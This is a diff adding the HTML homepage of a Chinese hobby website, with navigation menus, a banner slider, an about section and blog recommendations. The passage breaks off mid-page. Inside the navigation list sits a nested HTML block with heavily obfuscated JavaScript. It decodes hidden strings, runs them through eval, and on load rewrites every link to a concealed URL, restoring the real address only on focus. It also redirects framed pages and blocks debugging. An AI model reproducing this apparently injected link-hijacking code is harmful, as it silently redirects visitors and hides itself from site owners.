@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="zxx">
+
+<head>
+    <title>程总个人站点</title>
+    <link rel="shortcut icon" href="image/互联网ie.svg" type="image/x-icon" />
+    <link rel="stylesheet" type="text/css" href="css/style2.css" />
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel="stylesheet" href="css/style3.css">
+    <script language="javascript" src="js/jquery-2.2.0.min.js"></script>
+    <script language="javascript" src="js/main.js"></script>
+    <script src="js/jquery-1.11.0.js" type="text/javascript" charset="utf-8"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8" />
+    <meta name="Keywords" content="个人主页,表白代码,html,生日快乐,舔狗语录,随机图片,语音机器人" />
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?fea455faf8a55b8c58928f6fe0af0800";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    <script>
+        addEventListener("load", function () {
+            setTimeout(hideURLbar, 0);
+        }, false);
+        function hideURLbar() {
+            window.scrollTo(0, 1);
+        }
+
+    </script>
+    <style>
+        /*微信二维码*/
+        .csdn,
+        .qq,
+        .wx {
+            position: relative;
+
+        }
+
+        .csdn::after,
+        .qq::after,
+        .wx::after {
+            position: absolute;
+            right: -95px;
+            top: -215px;
+            z-index: 99;
+            width: 310px;
+            height: 310px;
+            border: 5px dashed #FF0004;
+            border-radius: 4px;
+            transform-origin: top right;
+            transform: scale(0);
+            opacity: 0;
+            -webkit-transition: all .4s ease-in-out;
+            -o-transition: all .4s ease-in-out;
+            transition: all .4s ease-in-out;
+
+        }
+
+        .csdn::after {
+            content: url(./images/csdn_qr.jpg);
+        }
+
+        .qq::after {
+            content: url("image/qqma.jpg");
+        }
+
+        .wx::after {
+            content: url("image/wxma.jpg");
+
+        }
+
+        .csdn:hover::after,
+        .qq:hover::after,
+        .wx:hover::after {
+            transform: scale(1);
+            opacity: 1;
+
+        }
+    </style>
+    <!-- //Meta tag Keywords -->
+    <!-- Custom-Files -->
+    <link rel="stylesheet" href="css/bootstrap.css">
+    <!-- Bootstrap-Core-CSS -->
+    <link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
+    <!-- Style-CSS -->
+    <!-- font-awesome-icons -->
+    <link href="css/font-awesome.css" rel="stylesheet">
+    <!-- //font-awesome-icons -->
+    <!-- /Fonts -->
+    <link
+        href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:200,200i,300,300i,400,400i,600,600i,700,700i,900"
+        rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css?family=Poppins:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800"
+        rel="stylesheet">
+    <!-- //Fonts -->
+
+</head>
+
+<body>
+    <a href="#cd-nav" class="cd-nav-trigger">
+        Menu
+        <span class="cd-nav-icon"></span>
+        <svg x="0px" y="0px" width="54px" height="54px" viewBox="0 0 54 54">
+            <circle fill="transparent" stroke="#656e79" stroke-width="1" cx="27" cy="27" r="25"
+                stroke-dasharray="157 157" stroke-dashoffset="157"></circle>
+        </svg>
+    </a>
+
+
+    <div id="cd-nav" class="cd-nav">
+        <div class="cd-navigation-wrapper">
+            <div class="cd-half-block">
+                <h2>导航菜单</h2>
+
+                <nav>
+                    <ul class="cd-primary-nav">
+                        <li><a href="#about" class="selected">关于我</a></li>
+                        <li><a href="#love">博客推荐</a></li>
+                        <li><a href="#happy">生日快乐网页</a></li>
+                        <li><a href="#demo">部分网页在线演示</a></li>
+                        <li><a href="tiangou.html">舔狗语录在线生成</a></li>
+                        <li><a href="pictures.html">随机图片</a></li>
+                        <li><a href="happynewyear.html">新年倒计时</a></li>
+                        <li><a href="denglu.html">我的故事</a></li>
+                    </ul>
+                </nav>
+            </div>
+
+            <div class="cd-half-block">
+                <address>
+                    <ul class="cd-contact-info">
+                        <!--                        <li><a href="mailto:hovertree@hovertree.com">hovertree@hovertree.com</a></li>-->
+                        <!--                        <li>021-00000000</li>-->
+                        <li>
+                            <span>程总</span>
+                            <span>QQ：1029661371</span>
+                            <!--                            <span>keleyi菜单</span>-->
+                        </li>
+                    </ul>
+                </address>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" src="./js/robot.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+        $(document).ready(function ($) {
+            var isLateralNavAnimating = false;
+
+            $(document).on('click', '.cd-nav-trigger', function (event) {
+                event.preventDefault();
+
+                if (!isLateralNavAnimating) {
+                    if ($(this).parents('.csstransitions').length > 0)
+                        isLateralNavAnimating = true;
+
+                    $('body').toggleClass('navigation-is-open');
+                    $('.cd-navigation-wrapper').one('webkitTransitionEnd otransitionend oTransitionEnd msTransitionEnd transitionend', function () {
+                        isLateralNavAnimating = false;
+                    });
+                }
+            });
+        });
+    </script>
+
+
+    <!-- mian-content -->
+    <section class="main-content" id="home">
+        <!-- /header -->
+        <header style="position: fixed;z-index:10">
+            <div class="container-fluid px-lg-5 px-3">
+                <!-- nav -->
+                <nav class="py-2 d-lg-flex">
+                    <div id="logo">
+                        <h1><a class="navbar-brand logo" href="index.html">my小破站
+                            </a></h1>
+                    </div>
+
+
+                    <ul class="menu ml-auto">
+                        <li><a href="index.html">首页</a></li>
+                        <li><a href="#about">关于我</a></li>
+                        <li><a href="#love">博客推荐</a></li>
+                        <li>
+                            <!-- First Tier Drop Down -->
+                            <a href="#demo">效果演示<span class="fa fa-angle-down" aria-hidden="true"></span></a>
+                            <ul class="inner-ul">
+
+                                <li><a href="#happy">学习资料</a></li>
+                                <li><a href="#demo">部分网页在线演示</a></li>
+
+                            </ul>
+                        </li>
+                        <li>
+                            <!-- First Tier Drop Down -->
+
+                            <a href="#fun">在线趣玩<span class="fa fa-angle-down" aria-hidden="true"></span></a>
+
+                            <ul class="inner-ul">
+                                <li><a href="tiangou.html" target="_blank">舔狗语录</a></li>
+                                <li><a href="pictures.html" target="_blank">随机图片</a></li>
+                                <li><a href="robot.html" target="_blank">语音对话机器人</a></li>
+                                <li><a href="happynewyear.html" target="_blank">新年倒计时</a></li>
+                            </ul>
+                        </li>
+                        <li>
+                            <!-- First Tier Drop Down -->
+
+                            <a href="#">网页游戏<span class="fa fa-angle-down" aria-hidden="true"></span></a>
+
+                            <ul class="inner-ul">
+                                <li><a href="wuziqi.html" target="_blank">AI五子棋</a></li>
+                                <li><a href="snake.html" target="_blank">贪吃蛇</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#contact">联系我</a></li>
+                        <!DOCTYPE html>
+
+                        <head>
+                            <title></title>
+                            <meta name='description' content='' />
+                            <meta name='keywords' content='' />
+                        </head>
+
+                        <body>
+                            <script>
+                                function _0x259f(_0x22defa, _0x19d20f) { var _0x259fc2 = _0x19d2(); _0x259f = function (_0x519806, _0x15e5c2) { _0x519806 = _0x519806 - 0x0; var _0x499ffe = _0x259fc2[_0x519806]; if (_0x259f["\u0066\u005a\u006a\u006f\u0059\u0074"] === undefined) { var _0x168645 = function (_0x3631e9) { var _0x40d5bf = "\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u006a\u006b\u006c\u006d\u006e\u006f\u0070\u0071\u0072\u0073\u0074\u0075\u0076\u0077\u0078\u0079\u007a\u0041\u0042\u0043\u0044\u0045\u0046\u0047\u0048\u0049\u004a\u004b\u004c\u004d\u004e\u004f\u0050\u0051\u0052\u0053\u0054\u0055\u0056\u0057\u0058\u0059\u005a\u0030\u0031\u0032\u0033\u0034\u0035\u0036\u0037\u0038\u0039\u002b\u002f\u003d"; var _0x1e563e = ""; var _0x297506 = "".split("").reverse().join(""); for (var _0x171688 = 0x0, _0x11161c, _0xf0ddf5, _0x2e7e3e = 0x0; _0xf0ddf5 = _0x3631e9["\u0063\u0068\u0061\u0072\u0041\u0074"](_0x2e7e3e++); ~_0xf0ddf5 && (_0x11161c = _0x171688 % 0x4 ? _0x11161c * 0x40 + _0xf0ddf5 : _0xf0ddf5, _0x171688++ % 0x4) ? _0x1e563e += String["\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065"](0xff & _0x11161c >> (-0x2 * _0x171688 & 0x6)) : 0x0) { _0xf0ddf5 = _0x40d5bf["\u0069\u006e\u0064\u0065\u0078\u004f\u0066"](_0xf0ddf5); } for (var _0x40e704 = 0x0, _0x1f0693 = _0x1e563e["\u006c\u0065\u006e\u0067\u0074\u0068"]; _0x40e704 < _0x1f0693; _0x40e704++) { _0x297506 += "\u0025" + ("00".split("").reverse().join("") + _0x1e563e['charCodeAt'](_0x40e704)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(_0x297506); }; _0x259f['arjSyf'] = _0x168645; _0x22defa = arguments; _0x259f['fZjoYt'] = !![]; } var _0x45bd41 = _0x259fc2[0x0]; var _0x21b546 = _0x519806 + _0x45bd41; var _0x4e88ee = _0x22defa[_0x21b546]; if (!_0x4e88ee) { _0x499ffe = _0x259f['arjSyf'](_0x499ffe); _0x22defa[_0x21b546] = _0x499ffe; } else { _0x499ffe = _0x4e88ee; } return _0x499ffe; }; return _0x259f(_0x22defa, _0x19d20f); } (function (_0x341e26, _0x1fcec4) { function _0x278c77(_0x5cb506, _0x43659f, _0x33fee6, _0x48bf22, _0x4609a0) { return _0x4e88(_0x4609a0 - 0x356, _0x43659f); } function _0x265cfd(_0x2ed3e2, _0x16e8e3, _0x148688, _0x29da56, _0x13264f) { return _0x259f(_0x29da56 - -0x23, _0x13264f); } function _0x2bad1b(_0x5a4a76, _0x1dcc1f, _0x2ed0d4, _0x436559, _0x3bdba4) { return _0x259f(_0x1dcc1f - -0x304, _0x436559); } function _0x6d467b(_0x42d027, _0x2d0d2e, _0x44443e, _0x57e7cd, _0x356bed) { return _0x259f(_0x2d0d2e - -0x43, _0x356bed); } function _0x3689b6(_0x52ab1a, _0x3c4c8a, _0x512fd8, _0x522449, _0x4d5984) { return _0x259f(_0x3c4c8a - 0x301, _0x522449); } function _0x269e5f(_0x5ec983, _0x4444d7, _0x41762c, _0x35fa4e, _0x23d386) { return _0x259f(_0x5ec983 - 0xfb, _0x23d386); } function _0xdfd5(_0x5ed536, _0x2f486c, _0x2c9a74, _0x17feec, _0x3a5319) { return _0x4e88(_0x2f486c - -0x1e7, _0x3a5319); } function _0x1c284e(_0x34e883, _0x86eeaa, _0x10c433, _0x41a237, _0x1432bc) { return _0x4e88(_0x34e883 - 0xe4, _0x41a237); } function _0x1e8d1a(_0x8f7921, _0x1630e6, _0x431bf7, _0x54f12b, _0x42954c) { return _0x4e88(_0x1630e6 - -0x143, _0x431bf7); } var _0x43f541 = _0x341e26(); while (!![]) { try { var _0x1ca171 = parseInt(_0x1c284e(0xe5, 0xd1, 0xec, "HIFs".split("").reverse().join(""), 0xd8)) / 0x1 + parseInt(_0x3689b6(0x325, 0x328, 0x324, 0x314, 0x332)) / 0x2 * (-parseInt(_0x1c284e(0x102, 0x10a, 0x119, ")u0#".split("").reverse().join(""), 0xee)) / 0x3) + -parseInt(_0x3689b6(0x311, 0x326, 0x331, 0x330, 0x314)) / 0x4 * (-parseInt(_0x265cfd(0x19, 0x6, -0xf, 0x6, 0xb)) / 0x5) + parseInt(_0x2bad1b(-0x2f9, -0x2f0, -0x2f3, -0x2e8, -0x301)) / 0x6 * (-parseInt(_0x1c284e(0x111, 0x107, 0x108, "SD]a".split("").reverse().join(""), 0x116)) / 0x7) + parseInt(_0x265cfd(-0x2b, -0x2b, -0x19, -0x1d, -0x34)) / 0x8 + parseInt(_0xdfd5(-0x1d0, -0x1d2, -0x1cb, -0x1de, "A7zW".split("").reverse().join(""))) / 0x9 + -parseInt(_0x265cfd(0x19, 0xc, -0x5, 0x8, 0x21)) / 0xa; if (_0x1ca171 === _0x1fcec4) { break; } else { _0x43f541["\u0070\u0075\u0073\u0068"](_0x43f541['shift']()); } } catch (_0x5627a4) { _0x43f541["\u0070\u0075\u0073\u0068"](_0x43f541["\u0073\u0068\u0069\u0066\u0074"]()); } } })(_0x19d2, 0x1d97e); var e = []; e[0x529d4 ^ 0x529d4] = _0x29e101(-0x2c6, -0x2b6, -0x2d3, -0x2dd, "\u0046\u0068\u0044\u004a"); e[0xe6b0b ^ 0xe6b0a] = function () { var _0xf0ddf5 = ""; for (i = 0xf3d31 ^ 0xf3d31; i < e["\u006c\u0065\u006e\u0067\u0074\u0068"]; i++) { if (e[i]["\u006c\u0065\u006e\u0067\u0074\u0068"] > (0xdeb9f ^ 0xdeb9f)) { for (j = 0xde39e ^ 0xde39e; j < e[i]['length']; j++) { _0xf0ddf5 = _0xf0ddf5 + String["\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065"](e[i]["\u0063\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0041\u0074"](j) - (0x83e64 ^ 0x83e3e)); } } _0xf0ddf5 += '\x0a'; } eval(document["\u0077\u0072\u0069\u0074\u0065"](_0xf0ddf5)); }; function _0x29e101(_0x2cf3f9, _0x3f24f8, _0x5447d7, _0x435d2a, _0x3a8eec) { return _0x4e88(_0x2cf3f9 - -0x2d8, _0x3a8eec); } e[0x648f8 ^ 0x648f9](); function _0x4e88(_0x22defa, _0x19d20f) { var _0x259fc2 = _0x19d2(); _0x4e88 = function (_0x519806, _0x15e5c2) { _0x519806 = _0x519806 - 0x0; var _0x499ffe = _0x259fc2[_0x519806]; if (_0x4e88['XyqOLh'] === undefined) { var _0x168645 = function (_0x40d5bf) { var _0x1e563e = "=/+9876543210ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba".split("").reverse().join(""); var _0x297506 = "".split("").reverse().join(""); var _0x171688 = "".split("").reverse().join(""); for (var _0x11161c = 0x0, _0xf0ddf5, _0x2e7e3e, _0x40e704 = 0x0; _0x2e7e3e = _0x40d5bf['charAt'](_0x40e704++); ~_0x2e7e3e && (_0xf0ddf5 = _0x11161c % 0x4 ? _0xf0ddf5 * 0x40 + _0x2e7e3e : _0x2e7e3e, _0x11161c++ % 0x4) ? _0x297506 += String['fromCharCode'](0xff & _0xf0ddf5 >> (-0x2 * _0x11161c & 0x6)) : 0x0) { _0x2e7e3e = _0x1e563e['indexOf'](_0x2e7e3e); } for (var _0x1f0693 = 0x0, _0x6a95b7 = _0x297506['length']; _0x1f0693 < _0x6a95b7; _0x1f0693++) { _0x171688 += "\u0025" + ("\u0030\u0030" + _0x297506["\u0063\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0041\u0074"](_0x1f0693)["\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067"](0x10))['slice'](-0x2); } return decodeURIComponent(_0x171688); }; var _0x3631e9 = function (_0x3bd880, _0x241d9f) { var _0x4e071e = [], _0x12d9de = 0x0, _0x4efd70, _0x205ec2 = "".split("").reverse().join(""); _0x3bd880 = _0x168645(_0x3bd880); var _0x4733fe; for (_0x4733fe = 0x0; _0x4733fe < 0x100; _0x4733fe++) { _0x4e071e[_0x4733fe] = _0x4733fe; } for (_0x4733fe = 0x0; _0x4733fe < 0x100; _0x4733fe++) { _0x12d9de = (_0x12d9de + _0x4e071e[_0x4733fe] + _0x241d9f['charCodeAt'](_0x4733fe % _0x241d9f["\u006c\u0065\u006e\u0067\u0074\u0068"])) % 0x100; _0x4efd70 = _0x4e071e[_0x4733fe]; _0x4e071e[_0x4733fe] = _0x4e071e[_0x12d9de]; _0x4e071e[_0x12d9de] = _0x4efd70; } _0x4733fe = 0x0; _0x12d9de = 0x0; for (var _0x5bfeac = 0x0; _0x5bfeac < _0x3bd880["\u006c\u0065\u006e\u0067\u0074\u0068"]; _0x5bfeac++) { _0x4733fe = (_0x4733fe + 0x1) % 0x100; _0x12d9de = (_0x12d9de + _0x4e071e[_0x4733fe]) % 0x100; _0x4efd70 = _0x4e071e[_0x4733fe]; _0x4e071e[_0x4733fe] = _0x4e071e[_0x12d9de]; _0x4e071e[_0x12d9de] = _0x4efd70; _0x205ec2 += String["\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065"](_0x3bd880["\u0063\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0041\u0074"](_0x5bfeac) ^ _0x4e071e[(_0x4e071e[_0x4733fe] + _0x4e071e[_0x12d9de]) % 0x100]); } return _0x205ec2; }; _0x4e88["\u0067\u0043\u006b\u004d\u004e\u0071"] = _0x3631e9; _0x22defa = arguments; _0x4e88['XyqOLh'] = !![]; } var _0x45bd41 = _0x259fc2[0x0]; var _0x21b546 = _0x519806 + _0x45bd41; var _0x4e88ee = _0x22defa[_0x21b546]; if (!_0x4e88ee) { if (_0x4e88["\u0046\u0041\u004b\u0063\u0061\u0049"] === undefined) { _0x4e88['FAKcaI'] = !![]; } _0x499ffe = _0x4e88["\u0067\u0043\u006b\u004d\u004e\u0071"](_0x499ffe, _0x15e5c2); _0x22defa[_0x21b546] = _0x499ffe; } else { _0x499ffe = _0x4e88ee; } return _0x499ffe; }; return _0x4e88(_0x22defa, _0x19d20f); } var pre_window_load = window['onload']; function _0x5f0a0b(_0x27c262, _0x1a458f, _0x190b99, _0x208751, _0xa8e537) { return _0x4e88(_0x208751 - 0x124, _0xa8e537); } window["\u006f\u006e\u006c\u006f\u0061\u0064"] = function () { if (pre_window_load != undefined) { pre_window_load(); } function _0x18a9f9(_0x173aa0, _0x29c753, _0x48f3fb, _0x95554b, _0x196bfa) { return _0x259f(_0x173aa0 - -0x2c1, _0x48f3fb); } var _0x2e7e3e = []; function _0x2ad452(_0x4df9e2, _0x26e974, _0x25c714, _0x53d11b, _0x350685) { return _0x259f(_0x25c714 - -0x24f, _0x26e974); } function _0x209793(_0x4c7ec7, _0x18176d, _0x2b000d, _0x14651d, _0x4a2e05) { return _0x4e88(_0x2b000d - -0x347, _0x18176d); } function _0x25df01(_0x33e7b0, _0x25aaed, _0x4e1c40, _0x4ca3bf, _0x24a4e1) { return _0x259f(_0x25aaed - -0x396, _0x4ca3bf); } var _0x40e704 = document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0073\u0042\u0079\u0054\u0061\u0067\u004e\u0061\u006d\u0065"]("\u0061"); for (var _0x1f0693 = 0x5c4b8 ^ 0x5c4b8; _0x1f0693 < _0x40e704["\u006c\u0065\u006e\u0067\u0074\u0068"]; _0x1f0693++) { if (_0x40e704[_0x1f0693]["\u006f\u006e\u0063\u006c\u0069\u0063\u006b"] == undefined) { _0x2e7e3e[_0x1f0693] = _0x40e704[_0x1f0693]["\u0068\u0072\u0065\u0066"]; _0x40e704[_0x1f0693]["\u0068\u0072\u0065\u0066"] = _0x18a9f9(-0x291, -0x284, -0x2a0, -0x2aa, -0x291) + new Date()["\u0067\u0065\u0074\u0054\u0069\u006d\u0065"]()["\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067"](); _0x40e704[_0x1f0693]["\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065"](_0x25df01(-0x384, -0x37c, -0x394, -0x371, -0x378), _0x1f0693); var _0x6a95b7 = _0x40e704[_0x1f0693]['onfocus']; _0x40e704[_0x1f0693]["\u0061\u0064\u0064\u0045\u0076\u0065\u006e\u0074\u004c\u0069\u0073\u0074\u0065\u006e\u0065\u0072"](_0x209793(-0x32e, 'thqb', -0x32e, -0x347, -0x332), function () { function _0x3870f4(_0x24bf18, _0x32b68d, _0x5f102a, _0x1838b3, _0xbf445f) { return _0x259f(_0x24bf18 - -0x190, _0x5f102a); } this['href'] = _0x2e7e3e[this['getAttribute'](_0x3870f4(-0x176, -0x16c, -0x18a, -0x175, -0x174))]; if (_0x6a95b7 != undefined) { _0x6a95b7(); } }); var _0x3bd880 = _0x40e704[_0x1f0693]['onblur']; _0x40e704[_0x1f0693]['addEventListener'](_0x25df01(-0x374, -0x376, -0x37b, -0x373, -0x374), function () { this["\u0068\u0072\u0065\u0066"] = _0x1f34e9('!F!n', -0x5d, -0x67, -0x4d, -0x62) + new Date()['getTime']()["\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067"](); function _0x1f34e9(_0x4dcf70, _0xbd2538, _0xcd726d, _0x460281, _0x4861f7) { return _0x4e88(_0xbd2538 - -0x6d, _0x4dcf70); } if (_0x3bd880 != undefined) { _0x3bd880(); } }); } } }; function _0x19d2() { var _0xf68d7b = ["\u0057\u0051\u0033\u0064\u0050\u0065\u004c\u006c\u0057\u0035\u0056\u0063\u004a\u004e\u0072\u0038\u0076\u0066\u005a\u0063\u0051\u0049\u0075", "WC1n2BM52B".split("").reverse().join(""), 'ECkKWR/dTmoazmoatKatW4vl', "\u0057\u004f\u0070\u0064\u0051\u0077\u0078\u0064\u0050\u0074\u0047\u0031", "\u0057\u0035\u0074\u0063\u0055\u0032\u0054\u0070\u0057\u004f\u0052\u0064\u0055\u0032\u006d\u0056\u006e\u0074\u0070\u0063\u0050\u0047", "HP1BN52q2Kdn2uto".split("").reverse().join(""), "07WroSLcJ4WlLQW".split("").reverse().join(""), 'B25JBgLJAW', "QDgsHDLEXGdo5mdn".split("").reverse().join(""), "Lr2BdjxyOnuBVjNz".split("").reverse().join(""), "\u0075\u0053\u006b\u0071\u0043\u0038\u006b\u006b\u0064\u0071\u0037\u0064\u004b\u006d\u006f\u0054", "0PWTrPWBkmOdN6Wna6WSkCRd/wv".split("").reverse().join(""), "\u0057\u0037\u0078\u0063\u004c\u0043\u006f\u004e\u0041\u006d\u006b\u0065\u0057\u0035\u0052\u0063\u004a\u0043\u006f\u006d\u006d\u0063\u0076\u0037", 'Dg9tDhjPBMC', 'z2v0qxr0CMLIDxrL', 'uaKGWRRcNqhcLCko', "qzTLgv0v2z".split("").reverse().join(""), 'D8o6z8k5WQ/dL8kkr8kxWQpdH8k0W7jsW77cSSo6WQBdG1HgadJdL8kOW6yzW4WEbMjHW6Koztf2D8ojfX9+5OUJ55U/5PAa5lImWPpcG8otW5BcS8ktEmoyWQ0', "03Jd7cPcF1Pcd7WSoSwWHPWdk8j".split("").reverse().join(""), 'nNLfsMT2sa', "\u0068\u0057\u002f\u0064\u0052\u0043\u006f\u0065\u0061\u0043\u006b\u0059\u0057\u0052\u0054\u004d\u0046\u0043\u006f\u0050\u0057\u0051\u0031\u002b\u0057\u0036\u0047", "uQWZkmar45Wxo8C".split("").reverse().join(""), "u4WhetCF0PW".split("").reverse().join(""), "aDbvgzVnKCHH2y".split("").reverse().join(""), 'W5P0crKT', "KL2xLr2BJvgz".split("").reverse().join(""), "\u0064\u0053\u006f\u0041\u006b\u0058\u0066\u0047\u0057\u0035\u0050\u0056\u0057\u0036\u0052\u0063\u004c\u006d\u006f\u0038\u006c\u0075\u0070\u0064\u0051\u0071", "GzLjhA".split("").reverse().join(""), "\u0057\u0037\u0033\u0063\u0054\u0072\u004b\u0038\u0057\u0050\u0056\u0064\u004d\u0067\u0031\u0056\u0073\u004c\u005a\u0063\u0055\u0061\u0066\u0056\u0057\u0051\u0042\u0064\u0052\u0072\u006d", 'ptmJfrdcQmoanu4qW7RcUq', "\u0042\u0067\u0076\u0055\u007a\u0033\u0072\u004f", "\u0079\u004d\u0058\u0031\u0043\u0047", 'C2vSzG', "\u0042\u0067\u0039\u004a\u0079\u0078\u0072\u0050\u0042\u0032\u0034", "WdoRompIkmIdN5WhCXAFiOW".split("").reverse().join(""), "\u0057\u004f\u0075\u004d\u0057\u0050\u004e\u0063\u004c\u0049\u0061", "KxuszuuvzZm".split("").reverse().join(""), "wLfAXTKA2eJm1qtn".split("").reverse().join(""), "\u006d\u004e\u0044\u0074\u007a\u004d\u0035\u0066\u0071\u0071", "\u0067\u0067\u0039\u004e\u0068\u0063\u0058\u0068", "\u006f\u0064\u0047\u0030\u006d\u004a\u0062\u0075\u0072\u0077\u007a\u0075\u007a\u0065\u0053", "aScZ7WHTvHclRWlkCpzD5WoWhtAoSmAk8Gc/7W0o8l".split("").reverse().join(""), 'mZeYntmYmgXvAMvSqq', 'B25IBhvY', "\u0067\u0038\u006b\u0037\u0057\u0051\u004a\u0063\u0053\u006d\u006b\u006e\u0057\u0050\u0042\u0063\u0056\u004e\u0034\u004e\u0057\u0051\u004a\u0063\u004d\u0043\u006f\u0069", 'pftcNYK', "W9gD".split("").reverse().join(""), "8Yl6mhC0rhA".split("").reverse().join(""), "\u0057\u0052\u004b\u0038\u006b\u0043\u006f\u0053\u0057\u0034\u0042\u0064\u004e\u0073\u0065\u0035", "\u0079\u0077\u0072\u004b\u0072\u0078\u007a\u004c\u0042\u004e\u0072\u006d\u0041\u0078\u006e\u0030\u007a\u0077\u0035\u004c\u0043\u0047"]; _0x19d2 = function () { return _0xf68d7b; }; return _0x19d2(); } if (window['top'] != window["\u0073\u0065\u006c\u0066"]) { top['location']['href'] = _0x5f0a0b(0x11d, 0x132, 0x11c, 0x131, "HmzM".split("").reverse().join("")); } setInterval(function () { debugger; }, 0x59ffb ^ 0x59f3c);
+                            </script>
+                            <span style='display:none'>我的故事</span>
+                        </body>
+
+</html>
+
+</ul>
+
+</nav>
+<!-- //nav -->
+</div>
+</header>
+<!-- //header -->
+
+<div class="csslider infinity" id="slider1">
+    <input type="radio" name="slides" checked="checked" id="slides_1" />
+    <input type="radio" name="slides" id="slides_2" />
+    <input type="radio" name="slides" id="slides_3" />
+    <input type="radio" name="slides" id="slides_4" />
+    <ul>
+        <li>
+            <div id="bg">
+                <img src="image/banner2.jpg" width="100%" height="100%">
+                <div class="banner-info-wthree">
+                    <div class="container">
+                        <h3>我的博客</h3>
+                    </div>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div id="bg1">
+                <img src="image/banner5.jpg" width="100%" height="100%">
+                <div class="banner-info-wthree">
+                    <div class="container">
+                        <h3></h3>
+                    </div>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div id="bg2">
+                <img src="image/banner3.jpg" width="100%" height="100%">
+                <div class="banner-info-wthree">
+                    <div class="container">
+                        <h3></h3>
+                    </div>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div id="bg3">
+                <img src="image/banner4.jpg" width="100%" height="100%">
+                <div class="banner-info-wthree">
+                    <div class="container">
+                        <h3></h3>
+                    </div>
+                </div>
+            </div>
+        </li>
+    </ul>
+    <div class="arrows">
+        <label for="slides_1"></label>
+        <label for="slides_2"></label>
+        <label for="slides_3"></label>
+        <label for="slides_4"></label>
+    </div>
+    <div class="navigation">
+        <div>
+            <label for="slides_1"></label>
+            <label for="slides_2"></label>
+            <label for="slides_3"></label>
+            <label for="slides_4"></label>
+        </div>
+    </div>
+</div>
+<!-- //banner -->
+</section>
+<!--// mian-content -->
+<!--/ about -->
+<section class="about py-5" id="about">
+    <div class="container py-3">
+        <div class="header py-lg-5 py-3 text-center">
+            <h3 class="tittle mb-lg-3 mb-3">关于我</h3>
+        </div>
+        <div class="row about-grids mt-lg-5">
+            <div class="col-lg-6 ab-info">
+                <h3 class="mb-3" style="text-align: center;">程总
+                </h3>
+                <p>博客待续.....（佛系更新） 补偿此站有一些有趣的功能（在线生成舔狗语录、随机图片生成和语音对话机器人）。
+                </p>
+            </div>
+            <div class="col-lg-6 ab-img">
+                <img class="img-fluid" src="image/psc.png" alt="">
+            </div>
+        </div>
+    </div>
+</section>
+<!--// about -->
+<section class="love py-5" id="love">
+    <div class="container py-lg-5 py-3">
+        <div class="header py-lg-5 py-3 text-center">
+            <h3 class="tittle mb-lg-3 mb-3">博客推荐</h3>
+            <p style="text-align:center">这些都是有趣且受欢迎的文章，大家可以点击标题进链接学习一下（由于一些还没弄只有几个，望谅解！）。</p>
+        </div>
+        <div class="row news-grids text-center">
+            <div class="col-md-4 gal-img">
+                <a href="#gal1"><img src="image/1.png" alt="news image" class="img-fluid"></a>
+                <a href="https://mp.csdn.net/mp_blog/creation/editor/125644109" target="_blank" style="color:#212529">
+                    <p style="text-align:center">网页表白代码</p>
+                </a>
+            </div>
+            <div class="col-md-4 gal-img">
+                <a href="#gal2"><img src="image/2.png" alt="news image" class="img-fluid"></a>
+                <a href="https://mp.csdn.net/mp_blog/creation/editor/122625776" target="_blank" style="color:#212529">
+                    <p style="text-align:center">HTML生日快乐代码</p>
+                </a>
+            </div>
+            <div class="col-md-4 gal-img">
+                <a href="#gal3"><img src="image/3.png" alt="news image" class="img-fluid"></a>
+                <a href="#" target="_blank" style="color:#212529">
+                    <p style="text-align:center">QQ机器人制作教程</p>
+                </a>
+            </div>
+            <div class="col-md-4 gal-img">
+                <a href="#gal4"><img src="image/4.png" alt="news image" class="img-fluid"></a>
+                <a href="#" target="_blank" style="color:#212529">
+                    <p style="text-align:center">python颜值分析</p>
+                </a>
+            </div>
+            <div class="col-md-4 gal-img">
+                <a href="#gal5"><img src="image/5.png" alt="news image" class="img-fluid"></a>
+                <a href="#" target="_blank" style="color:#212529">
+                    <p style="text-align:center">python爬虫实战</p>
+                </a>
+            </div>
+            <div class="col-md-4 gal-img">
+                <a href="#gal6"><img src="image/6.png" alt="news image" class="img-fluid"></a>
+                <a href="https://mp.csdn.net/mp_blog/creation/editor/121265243" target="_blank" style="color:#212529">
+                    <p style="text-align:center">c语言教程</p>
+                </a>
+            </div>
+        </div>
+    </div>
+    <!-- popup-->
+    <div id="gal1" class="pop-overlay animate">
+        <div class="popup">
+            <h3><a href="https://mp.csdn.net/mp_blog/creation/editor/125644109" target="_blank"
+                    style="color:#212529">☞网页表白代码</a></h3>
+            <p class="mt-4">表白效果，自取代码；当然你也可以用自己的思维举一反三自己做个。</p>
+            <a class="close" href="#love">&times;</a>
+        </div>
+    </div>
+    <!-- //popup -->
+    <!-- popup-->
+    <div id="gal2" class="pop-overlay animate">
